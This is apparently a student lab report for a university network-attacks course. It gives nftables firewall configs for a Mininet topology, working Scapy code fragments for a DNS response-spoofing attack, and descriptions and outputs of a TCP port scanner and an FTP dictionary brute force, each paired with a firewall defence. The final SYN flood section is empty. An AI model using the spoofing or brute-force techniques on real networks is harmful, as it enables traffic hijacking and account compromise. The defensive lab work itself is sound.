# LINFO2347 – Project Network Attacks

## Authors
Deroeux Elric (noma:)
Lévêque Quentin (noma:)

## Basic enterprise network protection
For the basic entreprise network protection we tried to keep our NFT super simplified.

- No statement have been made for routers behavior, we allow them to send/receive ping/connection.
- Routers forward behavior is "default drop" as it is a good practice

### r1 NFTable:
```
#!/usr/sbin/nft -f

flush ruleset

table inet filter { 
    chain input {
        type filter hook input priority 0; policy accept;
    }
    chain forward {
        type filter hook forward priority 0; policy drop;
        
        ct state established,related accept
        
        iif r1-eth0 oif r1-eth12 accept
    }
    chain output {
        type filter hook output priority 0; policy accept;
    }
}
```
- r1 could be ip-oriented `iif r1-eth0 ip saddr 10.1.0.0/24 accept` or shorter `iif r1-eth0 accept`.
- r1 accept response to new/old connections
- DMZ servers can ping each other has the case has been discuted in teams. Otherwise additionnal firewall would have been needed for each DMZ server.

### r2 NFTable: 
```
#!/usr/sbin/nft -f 

flush ruleset

table inet filter { 
    chain input {
        type filter hook input priority 0; policy accept;
    }
    chain forward {
        type filter hook forward priority 0; policy drop;
        
        ct state established,related accept	
        
        iif r2-eth12 oif r2-eth0 ip saddr 10.1.0.0/24 accept
        
        iif r2-eth0 oif r2-eth12 accept
    }
    chain input {
        type filter hook output priority 0; policy accept;
    }
}
```
- r2 need to allow packets from workstations IPs only.
- Everything from internet can come in because of r1 drop policy that will block packet not destinated to DMZ.
### Application of rules:
We modified the topo.py to apply our basic NFTables to r1 and r2.
```python
...
def apply_nftables_rules(net: Mininet) -> None:
    info("Applying nftables rules on r1...\n")
    info(net['r1'].cmd("nft -f ~/LINFO2347/r1.nft"))
    
    info("Applying nftables rules on r2...\n")
    info(net['r2'].cmd("nft -f ~/LINFO2347/r2.nft"))
...
```
We call this function after the `add_routes` function.


## DNS Cache Poisoning

### Attack
This script manage `r1` to intercept DNS requests from the workstations (`ws2` and `ws3`) and spoof the DNS response. By doing so, it aim to poison the DNS cache with a forged IP address (`1.2.3.4`) configurable, redirecting future requests for that domain (`example.com`) to a malicious server.
We use `example.com` due to the configuration of the DNS server that associate `example.com` to the IP adress `192.0.2.192` as it's specified in the dnsmasq config `address=/example.com/192.0.2.192`

#### Config
```
TARGET_DOMAIN = b"example.com."
FAKE_IP = "1.2.3.4"
DNS_PORT = 5353
```
#### Sniffing
`r1` start sniffing all the DNS packet that go through `r1-eth0` and start to anaylze them.
```python
from scapy.all import *
...
print(f"Listening for DNS queries on port {DNS_PORT}...")
sniff(filter=f"udp port {DNS_PORT}", iface="r1-eth0", prn=spoof_dns, store=0)
```
#### Filtering
It drop the packet that are not query and that are not asking about the domain `example.com`
```python
    ...
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        qname = pkt[DNSQR].qname
    else:
        return
        
    if qname != TARGET_DOMAIN:
        return
        
    print(f"{qname.decode()} found, spoofing DNS response ...")
    ...
```
#### Spoofing
It use informations of intercepted packet to build a credible response. 
It invert source and destination IPs and ports, it use the same ID request and use the fake ip adress.
Then it send the spoofed packet that should come before the DNS response.
```python
...
    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    udp = UDP(dport=pkt[UDP].sport, sport=DNS_PORT)
    dns = DNS(
        id=pkt[DNS].id,
        qr=1,
        aa=1,
        qd=pkt[DNS].qd,
        an=DNSRR(rrname=qname, ttl= 300,rdata=FAKE_IP)
    )
    spoofed_pkt = ip / udp / dns
    send(spoofed_pkt, verbose=0)
    print(f"Spoofed packet sent with ip {FAKE_IP}")
...
```
#### Perform the attack
On `r1` execute the script `python3 ~/LINFO2347/attacks/dns_cache_poisoning/main.py`
Then on `ws2`OR/AND `ws3` perform a DNS query to the DNS server asking for example.com `dig @10.12.0.20 -p 5353 example.com +short`
#### Result
Based on the DNS response of the `dig` command
Either `192.0.2.192` if the attack missed or `1.2.3.4` if it worked

#### Limitation
We are aware that the DNS cache poisoning could have been performed on the DNS instead on the Workstation, that would have impacted all the network and be more persistant. 
The step would have been similar but the sniff would have to be on r2 to intercept our DNS server request.

### Protection
Since the attack is timed, `related/established` rule wont work. 
Neither for `ip saddr 10.12.0.20` or `sport 5353` due to the spoofing.
Default drop on `r1` output doesn't seems to work due to spoofing.

Allowing dnssec in the `/etc/dnsmasq.conf` could protect.

In a normal environement it would be very hard to assemble right timing, right ID and right port as it could be randomise too.
In one of these condition not proprelly done we could block the attack using an nftable.

(Or surely is it possible but we didnt found the way to do it).

## Network Port Scan (TCP)

### Attack

It performs a parallelized scan of every TCP port from 1 to 65535 on a set of target machines.

The script uses the `socket` library to perform a TCP connect scan. For each port in the full range (1–65535), it creates a TCP socket and attempts to connect to the specified IP and port using `sock.connect_ex((ip, port))`. If the connection is successful (i.e., no error is returned), the port is considered **open** and is reported in the output.

The scan is parallelized using a `ThreadPoolExecutor` with up to 200 concurrent threads, allowing efficient scanning of large port ranges. A timeout of 0.25 seconds is set on each socket to ensure the scan doesn't hang on unresponsive or filtered ports.

#### Limitations

This attack only targets **TCP ports**, meaning it will completely miss services that operate over **UDP**. For example, a running NTP server on UDP port 123 will not be detected by this scanner.

#### Result
```
mininet> internet python3 /home/student-linfo2347LINFO2347/network_port_scan.py
Scanning IP: 10.12.0.10
10.12.0.10:80 is open
Scanning 10.12.0.10 took 34.14 seconds
Scanning IP: 10.12.0.20
10.12.0.20:5353 is open
Scanning 10.12.0.20 took 69.55 seconds
Scanning IP: 10.12.0.30
Scanning 10.12.0.30 took 69.07 seconds
Scanning IP: 10.12.0.40
10.12.0.40:21 is open
Scanning 10.12.0.40 took 71.47 seconds

Port scanning completed.
```

### Protection

To mitigate TCP port scans, the router `r2` includes a firewall rule using `nftables` that detects and rate-limits suspicious TCP traffic.

A dynamic set `banned_ips` is used to store IP addresses that trigger the detection threshold. If a source IP sends more than 6 SYN packets per second, it is automatically added to the set and blocked for 1 hour.

We can monitor the list of banned IP addresses at any time using:

```
mininet> r2 nft list set inet filter banned_ips
```

```
table inet filter {
        set banned_ips {
                type ipv4_addr
                size 65535
                flags dynamic,timeout
                timeout 1h
                elements = { 10.2.0.2 timeout 1h expires 59m51s347ms }
        }
}
```

## FTP brute force

### Attack

This attack is designed to simulate a dictionary-based password guessing attack from the `internet` host in the Mininet topology.

The attack targets the FTP server running at `10.12.0.40` on the default port 21. It attempts to authenticate using the known username `student-linfo2347`. 

The list of passwords used in the attack was downloaded from the internet (`10k-most-common.txt`), representing common or leaked passwords frequently reused by users. To ensure success and simulate a real brute-force scenario, the correct password (`student123`) was manually appended to the list by us.

The attack script was implemented in Python using the built-in `ftplib` module, which provides FTP client capabilities. Each password from the list is tested sequentially using a simple login attempt. Failed attempts are displayed, and the script immediately stops once the correct password is found.

#### Limitations

While developing the FTP brute-force attack, we attempted to increase the speed of password testing by introducing multithreading and reducing the timeout value in the following line of code:

``` python
ftp.connect(TARGET_IP, TARGET_PORT, timeout=TIMEOUT)
```

However, we observed that lowering the timeout or increasing concurrency caused the server to behave unexpectedly. Specifically, even when the correct password was present in the list, the server would respond with a failed login.

As a result, we were forced to limit the number of requests sent to the server to maintain reliable behavior. With our chosen configuration, we were able to test approximately 4,000 passwords within a 5-minute window. Beyond that rate, the server became unstable and we risked missing the correct password even if it was in the wordlist.


#### Result

If the correct password is in the list:

```
Failed: jackson
Failed: purple
Failed: scooter
Failed: phoenix
Failed: aaaaaa
Password found: student123
Time: 10.54s
```

### Protection


To defend against the brute-force attack on the FTP server, we implemented a rule that limits the rate of incoming connection attempts to the FTP port (21). The following line was added to the firewall configuration:

```
tcp dport 21 ct state new limit rate over 10/minute burst 3 packets counter drop
```

This rule targets new TCP connections to port 21 (FTP). It allows up to 3 immediate connection attempts (the `burst`), after which it enforces a rate limit of 10 new connections per minute per IP address. If this rate is exceeded, further connection attempts are dropped silently. The `counter` keeps track of how many packets were affected by the rule.

After enabling this rule, we were no longer able to perform a successful brute-force attack as we did before. Even when the correct password (`student123`) was present in the wordlist, the server began dropping connections, preventing successful logins. The script produced the following output:

```
Failed: phoenix
Failed: aaaaaa
Failed: student123
Failed: morgan
Failed: tigers
Failed: porsche
Traceback (most recent call last):
```

## Syn flood

### Attack

#### Limitations

#### Result

### Protection
